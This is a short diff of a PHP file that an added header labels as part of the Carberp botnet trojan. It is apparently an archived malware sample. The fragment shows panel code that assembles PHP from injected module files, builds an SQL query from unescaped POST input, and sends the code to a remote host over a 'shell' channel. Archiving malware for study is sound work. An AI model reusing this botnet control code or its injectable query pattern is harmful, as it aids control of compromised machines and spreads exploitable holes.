@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
@@ -9,7 +20,8 @@ if(!empty($Cur['id'])){
 		$get_php .= file_get_contents('modules/admins/injects/start.php');
 		$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
 
-		if(!empty($_POST['submit'])){			$get_php .= '$mysqli->real_query("INSERT INTO bf_links (link, dev) VALUES (\''.$_POST['link'].'\', \''.$_POST['dev'].'\')");';
+		if(!empty($_POST['submit'])){
+			$get_php .= '$mysqli->real_query("INSERT INTO bf_links (link, dev) VALUES (\''.$_POST['link'].'\', \''.$_POST['dev'].'\')");';
 
 			$data = get_http($result->link, $get_php, $result->keyid, $result->shell);
 			print_r($data);
